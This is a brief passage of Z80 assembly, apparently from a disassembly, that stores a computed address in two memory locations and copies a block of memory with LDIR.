	ADD	HL,BC
	LD	(LF349),HL
	LD	(LF34B),HL
	EX	DE,HL
	INC	B
	INC	B
	PUSH	DE
	LDIR
	POP	HL
	PUSH	HL
	LD	DE,L00B4
